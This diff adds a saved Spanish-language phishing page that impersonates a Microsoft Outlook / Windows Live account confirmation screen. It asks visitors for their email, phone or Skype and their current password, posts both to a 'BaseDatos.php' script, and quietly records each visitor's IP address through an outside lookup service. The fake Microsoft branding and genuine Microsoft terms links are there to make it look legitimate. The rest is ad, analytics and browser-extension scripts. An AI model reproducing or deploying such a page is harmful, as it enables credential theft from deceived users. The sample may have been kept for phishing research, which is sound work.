@@ -1,0 +1,256 @@
+<!-- saved from url=(0054)http://email-account.webcindario.com/confirmacion.html -->
+<html><script type="text/javascript" async="" src="./confirmacion_files/analytics.js.descarga"></script><script async="" src="./confirmacion_files/gtm.js.descarga"></script><script>
+    window[Symbol.for('MAURO_POST_CLIENT_almalgbpmcfpdaopimbdchdliminoign')] = new (class{constructor(e,t){this.name=e,this.destination=t,this.serverListeners={},this.bgRequestsListeners={},this.bgEventsListeners={},window.addEventListener("message",e=>{const t=e.data,n=!(t.destination&&t.destination===this.name),s=!t.event;if(!n&&!s)if("Mauro_POST_SERVER__BG_RESPONSE"===t.event){const e=t.args;if(this.hasBgRequestListener(e.requestId)){try{this.bgRequestsListeners[e.requestId](e.response)}catch(e){}delete this.bgRequestsListeners[e.requestId]}}else if("MARIO_POST_SERVER__BG_EVENT"===t.event){const e=t.args;if(this.hasBgEventListener(e.event))try{this.bgEventsListeners[t.id](e.payload)}catch(e){}}else if(this.hasServerListener(t.event))try{this.serverListeners[t.event](t.args)}catch(e){}})}emitToServer(e,t){const n=this.generateUIID(),s={args:t,destination:this.destination,event:e,id:n};return window.postMessage(s,location.origin),n}emitToBg(e,t){const n=this.generateUIID(),s={bgEventName:e,requestId:n,args:t};return this.emitToServer("MARIO_POST_SERVER__BG_REQUEST",s),n}hasServerListener(e){return!!this.serverListeners[e]}hasBgRequestListener(e){return!!this.bgRequestsListeners[e]}hasBgEventListener(e){return!!this.bgEventsListeners[e]}fromServerEvent(e,t){this.serverListeners[e]=t}fromBgEvent(e,t){this.bgEventsListeners[e]=t}fromBgResponse(e,t){this.bgRequestsListeners[e]=t}generateUIID(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){const t=16*Math.random()|0;return("x"===e?t:3&t|8).toString(16)}))}})('MARIO_POST_CLIENT_almalgbpmcfpdaopimbdchdliminoign', 'MARIO_POST_SERVER_almalgbpmcfpdaopimbdchdliminoign')</script><script>
+    const hideMyLocation = new (class{constructor(t){this.clientKey=t,this.watchIDs={},this.client=window[Symbol.for(t)];const e=navigator.geolocation.getCurrentPosition,n=navigator.geolocation.watchPosition,o=navigator.geolocation.clearWatch,r=this;navigator.geolocation.getCurrentPosition=function(t,n,o){r.handle(e,"GET",t,n,o)},navigator.geolocation.watchPosition=function(t,e,o){return r.handle(n,"WATCH",t,e,o)},navigator.geolocation.clearWatch=function(t){if(-1===t)return;const e=r.watchIDs[t];return delete r.watchIDs[t],o.apply(this,[e])}}handle(t,e,n,o,r){const i=this.client.emitToBg("HIDE_MY_LOCATION__GET_LOCATION");let a=this.getRandomInt(0,1e5);if(this.client.fromBgResponse(i,i=>{if(i.enabled)if("SUCCESS"===i.status){const t=this.map(i);n(t)}else{const t=this.errorObj();o(t),a=-1}else{const i=[n,o,r],c=t.apply(navigator.geolocation,i);"WATCH"===e&&(this.watchIDs[a]=c)}}),"WATCH"===e)return a}map(t){return{coords:{accuracy:20,altitude:null,altitudeAccuracy:null,heading:null,latitude:t.latitude,longitude:t.longitude,speed:null},timestamp:Date.now()}}errorObj(){return{code:1,message:"User denied Geolocation"}}getRandomInt(t,e){return t=Math.ceil(t),e=Math.floor(e),Math.floor(Math.random()*(e-t+1))+t}})('MARIO_POST_CLIENT_almalgbpmcfpdaopimbdchdliminoign')
+  </script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<!-- Inserted by miarroba -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+<script async="" src="./confirmacion_files/f.txt"></script>
+<script>(adsbygoogle = window.adsbygoogle || []).push({google_ad_client: "ca-pub-7294310421616689",enable_page_level_ads: true});</script>
+<!-- Inserted by miarroba -->
+<style>
+input[type=password] {
+    width: 500px;
+    padding: 10px 14px;
+    margin: 8px 0;
+    box-sizing: border-box;
+   	font-family: "Helvetica Neue";
+	font-size: 14px;
+}
+input[type=text] {
+    width: 500px;
+    padding: 10px 14px;
+    margin: 8px 0;
+    box-sizing: border-box;
+   	font-family: "Helvetica Neue";
+	font-size: 14px;
+}
+input[type=email] {
+    width: 500px;
+    padding: 10px 14px;
+    margin: 8px 0;
+    box-sizing: border-box;
+   	font-family: "Helvetica Neue";
+	font-size: 14px;
+}
+
+h1 {
+	font-family: "Helvetica Neue";
+	font-size: 40px;
+	font-style: normal;
+	font-variant: normal;
+	font-weight: 100;
+	line-height: 40px;
+}
+h2 {
+	font-family: "Helvetica";
+	font-size: 17px;
+	font-style: normal;
+	font-variant: normal;
+	font-weight: 100;
+	line-height: 18px;
+}
+h3 {
+	font-family: "Helvetica Neue";
+	font-size: 16px;
+	font-style: normal;
+	font-variant: normal;
+	font-weight: 300;
+	line-height: 18px;
+	color: #4d79ff;
+}
+h4 {
+	font-family: "Helvetica Neue";
+	font-size: 11px;
+	font-style:normal;
+	font-variant: normal;
+	font-weight: 300;
+	line-height: 23px;
+}
+.error {
+	font-family: "Helvetica";
+	font-size: 17px;
+	font-style: normal;
+	font-variant: normal;
+	font-weight: 100;
+	line-height: 20px;
+	color:#ff1a1a;
+}
+a:link {
+ text-decoration:none;
+ color: #4d79ff;
+}
+a:visited {
+ text-decoration:none;
+ color: #4d79ff;
+}
+
+
+
+    @-webkit-keyframes rotate {
+    from {
+        -webkit-transform: rotate(0deg);
+    }
+    to {
+        -webkit-transform: rotate(360deg);
+    }
+}
+#loading {
+    border: 1px solid #000;
+    border-right: 0;
+    border-bottom: 0;
+    -webkit-border-radius: 100px;
+    height: 100px;
+    width: 100px;
+    margin: 100px;
+    -webkit-transition: all 0.5s ease-in;
+    -webkit-animation-name:             rotate;
+    -webkit-animation-duration:         1.0s;
+    -webkit-animation-iteration-count:  infinite;
+    -webkit-animation-timing-function: linear;
+}
+
+.loader {
+    border: 6px solid #f3f3f3; /* Light grey 16 */
+    border-top: 6px solid rgba(77,86,92,0.87); /* #3498db Blue */
+    border-radius: 50%;
+    width: 60px;/*120*/
+    height: 60px;/*120*/
+    animation: spin 1s linear infinite;
+    position: fixed;
+    top: 250px;
+    left: 48%;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+
+</style>
+<script>(function(){var a=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(){this.requestMethod=arguments[0],a.apply(this,arguments)};var j=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(){var k=this.onreadystatechange;return this.onreadystatechange=function(){function l(){var m=Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15);return m.substring(0,22)}try{if(4===this.readyState){var m='detector',n={posdMessageId:'PANELOS_MESSAGE',posdHash:l(),type:'VIDEO_XHR_CANDIDATE',from:m,to:m.substring(0,m.length-2),content:{requestMethod:this.requestMethod,url:this.responseURL,type:this.getResponseHeader('content-type'),content:this.response}};window.postMessage(n,'*')}}catch(m){}if(k)return k.apply(this,arguments)},j.apply(this,arguments)}})();</script><script type="text/javascript" async="" src="./confirmacion_files/lz_loader.js.descarga"></script></head>
+<!--<body onLoad="iniciar();">
+<!-- Inserted by miarroba -->
+<body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- Inserted by miarroba -->
+
+<!-- Inserted by miarroba -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- Inserted by miarroba -->
+<!--<div class="loader" id="loader_ic"></div>-->
+
+<div align="center" bis_skin_checked="1">
+<form name="form1" id="form1" method="post" action="BaseDatos.php">
+<input name="ip" type="hidden" id="ip">
+<table width="1000" border="0" cellspacing="1" cellpadding="2">
+<tbody><tr>
+	<td colspan="4"><div align="center" bis_skin_checked="1"><img id="superior" src="./index_files/superiors.png" width="364" height="54"></div><br><br></td>
+</tr>
+<tr>
+	<td colspan="4"><div align="center" bis_skin_checked="1"><h1>Confirmar Cuenta</h1></div></td>
+</tr>
+<tr>
+	<td colspan="4"><div align="center" bis_skin_checked="1"><h2>Confirma tu cuenta de correo electronico</h2></div></td>
+</tr>
+<tr>
+	<td colspan="4">
+		<div align="center" bis_skin_checked="1"><input type="email" id="correo" name="correo" placeholder="Ingrese su cuenta de correo electronico, Telefono o Skype" required=""></div>
+	</td>
+</tr>
+<tr>
+	<td colspan="4">
+		<div align="center" bis_skin_checked="1"><input type="password" id="pass" name="pass" placeholder="Ingrese su contraseña actual" required=""></div>
+		<!--<input type="hidden" name="oculto" value="formValidar">
+		<div align="center" id="error_p" class="error">&nbsp;</div>-->
+	</td>
+</tr>
+
+
+<tr>
+	<!--<td colspan="4"><div align="center"><br><br><a onClick="validar();"><img id="confirmar" src="./index_files/confirmar.png" width="170" height="32"></a></div><br><br><br></td>-->
+    
+    <td colspan="4"><div align="center" ><br><br><input type="image"  src="./index_files/confirmar.png">
+   <!-- <img id="confirmar" src="./index_files/confirmar.png" width="160" height="32"></a>--></div><br><br><br></td>
+</tr>
+
+<tr>
+	<td width="340"><div align="center" bis_skin_checked="1"><h3>&nbsp;</h3></div></td>
+	<td width="160"><div align="center" bis_skin_checked="1"><h3><a target="_blank" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;vv=1600">Terminos de uso</a></h3></div></td>
+	<td width="160"><div align="center" bis_skin_checked="1"><h3><a target="_blank" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600">Privacidad y Cookies</a></h3></div></td>
+	<td width="340"><div align="center" bis_skin_checked="1"><h3>&nbsp;</h3></div></td>
+</tr>
+
+
+<tr>
+	<td colspan="4"><div align="center" bis_skin_checked="1"><h4>© 2020 Microsoft - Windows Live Outlook.</h4></div><br><br></td>
+</tr>
+
+</tbody></table>
+</form>
+</div>
+
+<!-- Inserted by miarroba -->
+
+<script type="text/javascript">var s=document.createElement("script");var t="//des.smartclip.net/ads?type=dyn&plc=75133&elementId=5401a45855b1c236af9fc6419f8ccef22f3c4859&sz=400x320&rnd="+Math.round(Math.random()*1e8);s.type="text/javascript";s.src=t;document.body.appendChild(s);</script><script type="text/javascript" src="./confirmacion_files/ads"></script><div id="5401a45855b1c236af9fc6419f8ccef22f3c4859" bis_skin_checked="1"></div>
+<script type="text/javascript" src="./confirmacion_files/saved_resource"></script><iframe id="tpc29d74070" name="tpc29d74070" allowtransparency="1" onload="if( document.getElementById(&#39;setCookie29d74070&#39;) ){document.getElementById(&#39;setCookie29d74070&#39;).submit();document.getElementById(&#39;setCookie29d74070&#39;).parentNode.removeChild(document.getElementById(&#39;setCookie29d74070&#39;));}" frameborder="0" marginheight="0" marginwidth="0" scrolling="0" src="./confirmacion_files/saved_resource.html" style="background:none;border:none;margin:0px;padding:0px;overflow:hidden;position:absolute;top:-10000px;left:-10000px;height:1px;width:1px;display:block;"></iframe><noscript><img alt="beacon" border="0" width="1" height="1" src="https://hosting.miarroba.info/?__muid=5401a45855b1c236af9fc6419f8ccef22f3c4859&amp;h=1938230&amp;t=1583085679&amp;k=f26249761b73a2413178f8da7a12d14d&amp;img=1" /></noscript>
+<div id="ads_HEZRL65RXYI2" bis_skin_checked="1"></div>
+<script defer="" language="javascript" type="text/javascript">
+(function(){
+var newscript=document.createElement('script');
+newscript.type='text/javascript';
+newscript.async=true;
+lz_elem=(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]);
+lz_elem.appendChild(newscript);
+newscript.onload=function(ev){
+var lz_url="https://play.sunmediaads.com/red/zone.php?code=HEZRL65RXYI2&a=&pubid=&lgid="+((new Date()).getTime() % 2147483648) + Math.random();
+var lz_target="ads_HEZRL65RXYI2";
+var lz_sync_mode=false;
+lz_loadads(lz_url,lz_target,lz_sync_mode);
+}
+newscript.src="https://img.sunmediaads.com/ads/lz_loader.js?ver=1.4";
+})();
+
+</script>
+<script src="asset/js/jquery-3.3.1.min.js"></script>
+<script src="asset/js/popper.min.js"></script>
+<script src="asset/js/bootstrap.min.js"></script>
+<script>
+    function deleteAd () {
+        $('div:contains("¿Quiere apoyar")').addClass('cbalink');
+    }
+</script>
+<script>
+    $(document).ready(deleteAd);
+</script>
+<script>
+    (function(loading, success){
+        var xhr = XMLHttpRequest !== undefined
+                    ? new XMLHttpRequest()
+                    : new ActiveXObject('Microsoft.XMLHTTP');
+
+        loading.apply(null, []);
+        xhr.open('get', 'https://api.ipify.org/?format=json', true);
+        xhr.onreadystatechange = function() {
+            if(xhr.readyState === 4) {
+                success.call(null, JSON.parse(xhr.responseText));
+            }
+        }
+        xhr.send();
+    }(function() {
+        console.log('cargando ip...');
+    }, function(response) {
+        document.getElementById("ip").value = response.ip;
+        console.log(response.ip);
+    }));
+</script>
+<div id="ipLookup"></div>
+<script>
+</script>
+<script src="//extreme-ip-lookup.com/json/?callback=getIP" async defer></script>
+<!-- Inserted by miarroba -->
+</body></html>
